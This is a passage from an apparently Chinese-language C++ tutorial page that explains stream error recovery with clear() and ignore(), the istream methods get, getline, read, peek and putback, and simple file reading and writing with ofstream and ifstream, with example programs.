<code>failbit</code> 或 <code>badbit</code> 状态后，后续的 I/O 操作通常会立即失败。为了继续使用该流，必须<strong>清除</strong>错误状态。</p><ul><li>  <strong><code>clear(iostate state = goodbit)</code>:</strong> 重置流的状态位。默认情况下（不带参数或参数为 <code>goodbit</code>），它会清除所有错误位 (<code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)，使流恢复到 <code>good()</code> 状态。也可以用它来设置特定的状态位。</li></ul><p><strong>示例：处理输入错误</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // for numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter an integer: &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number)) &#123; <span class="comment">// 如果读取失败 (cin 返回 false)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please enter an integer: &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 清除错误状态</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 丢弃缓冲区中的错误输入</span></span><br><span class="line">        <span class="comment">// 读取并忽略直到下一个换行符或缓冲区结束的所有字符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个循环会一直要求用户输入，直到成功读取一个整数为止。关键在于读取失败后，必须先 <code>clear()</code> 错误标志，然后 <code>ignore()</code> 掉导致错误的无效输入，否则下一次循环的 <code>cin &gt;&gt; number</code> 还会因为同样的原因失败。</p><h3 id="17-3-3-其他-istream-类方法"><a href="#17-3-3-其他-istream-类方法" class="headerlink" title="17.3.3 其他 istream 类方法"></a>17.3.3 其他 istream 类方法</h3><p>除了 <code>&gt;&gt;</code> 运算符，<code>istream</code> 类还提供了其他用于输入的成员函数，它们提供了更精细的控制。</p><h4 id="1-单字符输入-get"><a href="#1-单字符输入-get" class="headerlink" title="1. 单字符输入: get()"></a>1. 单字符输入: <code>get()</code></h4><p><code>get()</code> 有几个版本用于读取单个字符：</p><ul><li>  <strong><code>int get()</code>:</strong> 读取下一个字符（即使是空白字符），并将其作为 <code>int</code> 类型返回。如果到达文件末尾，返回 <code>EOF</code> (一个特殊的负整数常量，定义在 <code>&lt;iostream&gt;</code> 或 <code>&lt;cstdio&gt;</code> 中)。</li><li>  <strong><code>istream&amp; get(char&amp; ch)</code>:</strong> 读取下一个字符（即使是空白字符），并将其存储在 <code>ch</code> 中。返回 <code>istream</code> 对象的引用。如果读取失败（如到达文件末尾），会设置 <code>failbit</code>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter characters (Ctrl+D/Ctrl+Z to end):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 get(char&amp;)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.get(ch)) &#123; <span class="comment">// 读取成功则循环继续</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.put(ch); <span class="comment">// 逐个输出读到的字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnd of input (using get(char&amp;)).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.clear(); <span class="comment">// 清除 eof 状态以便继续演示</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter characters again:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 使用 int get()</span></span><br><span class="line">    <span class="keyword">int</span> char_code;</span><br><span class="line">    <span class="keyword">while</span> ((char_code = <span class="built_in">std</span>::<span class="built_in">cin</span>.get()) != EOF) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(char_code));</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnd of input (using int get()).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get()</code> 不会跳过空白字符。</p><h4 id="2-字符串输入-get-和-getline"><a href="#2-字符串输入-get-和-getline" class="headerlink" title="2. 字符串输入: get() 和 getline()"></a>2. 字符串输入: <code>get()</code> 和 <code>getline()</code></h4><p><code>istream</code> 提供了用于读取 C 风格字符串（字符数组）的 <code>get()</code> 和 <code>getline()</code> 版本。</p><ul><li><p><strong><code>istream&amp; get(char* s, streamsize n, char delim = &#39;\n&#39;)</code>:</strong></p><ul><li>  从输入流读取字符，存储到字符数组 <code>s</code> 中。</li><li>  最多读取 <code>n-1</code> 个字符（为末尾的空字符 <code>\0</code> 留出空间）。</li><li>  遇到分隔符 <code>delim</code> 时停止读取。</li><li>  <strong>分隔符 <code>delim</code> 会被留在输入流中</strong>，不会被读取到 <code>s</code> 中。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li><li>  如果因为读取了 <code>n-1</code> 个字符而停止，会设置 <code>failbit</code>。</li></ul></li><li><p><strong><code>istream&amp; getline(char* s, streamsize n, char delim = &#39;\n&#39;)</code>:</strong></p><ul><li>  与 <code>get()</code> 类似，最多读取 <code>n-1</code> 个字符。</li><li>  遇到分隔符 <code>delim</code> 时停止读取。</li><li>  <strong>分隔符 <code>delim</code> 会从输入流中被读取并丢弃</strong>，不会存储在 <code>s</code> 中。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li><li>  如果因为读取了 <code>n-1</code> 个字符而停止（在遇到分隔符之前），会设置 <code>failbit</code>。</li></ul></li></ul><p><strong>主要区别:</strong> <code>getline()</code> 会读取并丢弃分隔符，而 <code>get()</code> 会将分隔符留在流中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line1[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> line2[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter line 1: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(line1, <span class="number">50</span>); <span class="comment">// 读取整行，丢弃换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter line 2: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(line2, <span class="number">50</span>); <span class="comment">// 读取整行，换行符留在缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: &quot;</span> &lt;&lt; line1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 2: &quot;</span> &lt;&lt; line2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 get() 之后缓冲区的内容</span></span><br><span class="line">    <span class="keyword">char</span> next_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character after get(): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(next_char); <span class="comment">// 读取留在缓冲区的换行符</span></span><br><span class="line">    <span class="keyword">if</span> (next_char == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;\\n&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; next_char &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 这些是用于 C 风格字符串的版本。对于 <code>std::string</code> 对象，应使用全局的 <code>getline(cin, str)</code> 函数（如 16.1 节所述）。</p><h3 id="17-3-4-其他-istream-方法"><a href="#17-3-4-其他-istream-方法" class="headerlink" title="17.3.4 其他 istream 方法"></a>17.3.4 其他 istream 方法</h3><ul><li><p>  <strong><code>read(char* s, streamsize n)</code>:</strong> 从流中读取<strong>精确 <code>n</code> 个字节</strong>，并存储到从 <code>s</code> 开始的内存中。它<strong>不会</strong>在遇到空字符或分隔符时停止，也不会添加空字符。主要用于读取<strong>二进制数据</strong>。如果读取的字节数少于 <code>n</code>（例如到达文件末尾），会设置 <code>eofbit</code> 和 <code>failbit</code>。</p></li><li><p>  <strong><code>peek()</code>:</strong> 返回输入流中的<strong>下一个字符</strong>的整数值，但<strong>不从流中移除</strong>该字符。如果到达文件末尾，返回 <code>EOF</code>。可用于在实际读取前查看下一个字符。</p></li><li><p>  <strong><code>gcount()</code>:</strong> 返回<strong>上一次未格式化读取操作</strong>（如 <code>get()</code>, <code>getline()</code>, <code>read()</code>）实际读取的<strong>字符数</strong>。对于 <code>&gt;&gt;</code> 运算符无效。</p></li><li><p>  <strong><code>putback(char c)</code>:</strong> 将字符 <code>c</code> <strong>放回</strong>输入流中，使其成为下一个被读取的字符。通常只能放回上一个读取的字符。</p></li><li><p><strong><code>ignore(streamsize n = 1, int delim = EOF)</code>:</strong> 读取并<strong>丢弃</strong>输入流中的字符。</p><ul><li>  最多丢弃 <code>n</code> 个字符。</li><li>  如果在此之前遇到并读取了分隔符 <code>delim</code>，则停止丢弃。</li><li>  分隔符 <code>delim</code> 本身也会被丢弃。</li><li>  常用于清除缓冲区中的无效输入或跳过不需要的部分。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter some text (e.g., abcdefghij): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.read(buffer, <span class="number">5</span>); <span class="comment">// 读取 5 个字节到 buffer</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">cin</span>.gcount() &lt;&lt; <span class="string">&quot; bytes: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.write(buffer, <span class="built_in">std</span>::<span class="built_in">cin</span>.gcount()) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出读取的内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> next = <span class="built_in">std</span>::<span class="built_in">cin</span>.peek(); <span class="comment">// 查看下一个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next char (peek): &#x27;&quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(next) &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> actual_next;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(actual_next); <span class="comment">// 实际读取下一个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Actual next char (get): &#x27;&quot;</span> &lt;&lt; actual_next &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.putback(actual_next); <span class="comment">// 将字符放回</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(actual_next); <span class="comment">// 再次读取</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read again after putback: &#x27;&quot;</span> &lt;&lt; actual_next &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Ignoring rest of the line...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// 忽略到行尾</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a final character: &quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> final_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; final_char; <span class="comment">// 现在可以读取新行的字符了</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final char: &quot;</span> &lt;&lt; final_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过组合使用 <code>cin &gt;&gt;</code> 和这些 <code>istream</code> 成员函数，可以实现灵活多样的输入处理逻辑，并能有效地处理输入错误。</p><h2 id="17-4-文件输入和输出"><a href="#17-4-文件输入和输出" class="headerlink" title="17.4 文件输入和输出"></a>17.4 文件输入和输出</h2><p>除了与控制台进行交互（<code>cin</code>, <code>cout</code>），程序经常需要从文件中读取数据或将数据写入文件。C++ 的 iostream 库通过 <code>&lt;fstream&gt;</code> 头文件提供了用于文件 I/O 的类。</p><p><code>&lt;fstream&gt;</code> 定义了三个主要的类：</p><ol><li> <strong><code>ifstream</code> (input file stream):</strong> 继承自 <code>istream</code>，专门用于从文件<strong>读取</strong>数据。</li><li> <strong><code>ofstream</code> (output file stream):</strong> 继承自 <code>ostream</code>，专门用于向文件<strong>写入</strong>数据。</li><li> <strong><code>fstream</code>:</strong> 继承自 <code>iostream</code>，可以同时支持文件的<strong>读取和写入</strong>。</li></ol><p>这些文件流类的使用方式与 <code>cin</code> 和 <code>cout</code> 非常相似，因为它们继承了相同的基类并支持相同的操作符（如 <code>&lt;&lt;</code>, <code>&gt;&gt;</code>) 和方法（如 <code>get()</code>, <code>getline()</code>, <code>write()</code>, <code>read()</code>）。</p><h3 id="17-4-1-简单的文件-I-O"><a href="#17-4-1-简单的文件-I-O" class="headerlink" title="17.4.1 简单的文件 I/O"></a>17.4.1 简单的文件 I/O</h3><p>进行文件 I/O 的基本步骤：</p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;fstream&gt;</code>。</li><li> <strong>创建流对象:</strong> 创建一个 <code>ifstream</code> (用于读取) 或 <code>ofstream</code> (用于写入) 或 <code>fstream</code> (用于读写) 对象。</li><li> <strong>关联文件:</strong> 将流对象与一个具体的文件关联起来。这可以在创建对象时通过构造函数完成，也可以之后使用 <code>open()</code> 方法。</li><li> <strong>检查是否成功打开:</strong> 使用 <code>is_open()</code> 方法或检查流对象的状态来确认文件是否成功打开。</li><li> <strong>进行 I/O 操作:</strong> 使用 <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>get()</code>, <code>getline()</code>, <code>write()</code>, <code>read()</code> 等方法读写文件，就像使用 <code>cin</code> 和 <code>cout</code> 一样。</li><li> <strong>关闭文件:</strong> 使用 <code>close()</code> 方法关闭文件，断开流对象与文件的关联。<strong>重要:</strong> 当文件流对象离开作用域时（例如函数结束），其析构函数会自动调用 <code>close()</code>，因此显式调用 <code>close()</code> 通常不是必需的，但有时为了明确或检查关闭状态可以这样做。</li></ol><p><strong>示例：写入文件</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt; // 包含 fstream 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ofstream 对象并通过构造函数关联文件</span></span><br><span class="line">    <span class="comment">// 默认以输出模式 (ios_base::out) 打开，如果文件存在则清空内容</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(<span class="string">&quot;mydata.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!outFile.is_open()) &#123; <span class="comment">// 或者 if (!outFile)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for writing!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 向文件写入数据 (类似 cout)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">95.5</span>;</span><br><span class="line"></span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data written to mydata.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件 (可选，析构函数会自动调用)</span></span><br><span class="line">    <span class="comment">// outFile.close();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// outFile 在这里离开作用域，析构函数调用 close()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：读取文件</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ifstream 对象并关联文件</span></span><br><span class="line">    <span class="comment">// 默认以输入模式 (ios_base::in) 打开</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;mydata.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for reading!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading data from mydata.txt:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 从文件读取数据 (类似 cin)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="comment">// 逐行读取</span></span><br><span class="line">    <span class="keyword">while</span> (getline(inFile, line)) &#123; <span class="comment">// 使用全局 getline 读取整行到 string</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 或者，如果知道格式，可以像 cin 一样读取</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    std::string label1, name, label2, label3;</span></span><br><span class="line"><span class="comment">    int age;</span></span><br><span class="line"><span class="comment">    double score;</span></span><br><span class="line"><span class="comment">    inFile &gt;&gt; label1 &gt;&gt; name &gt;&gt; label2 &gt;&gt; age &gt;&gt; label3 &gt;&gt; score;</span></span><br><span class="line"><span class="comment">    if (inFile) &#123; // 检查读取是否成功</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Name: &quot; &lt;&lt; name &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Age: &quot; &lt;&lt; age &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Score: &quot; &lt;&lt; score &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        std::cerr &lt;&lt; &quot;Error reading data format.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件 (可选)</span></span><br><span class="line">    <span class="comment">// inFile.close();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-4-2-流状态检查和-is-open"><a href="#17-4-2-流状态检查和-is-open" class="headerlink" title="17.4.2 流状态检查和 is_open()"></a>17.4.2 流状态检查和 is_open()</h3><ul><li>  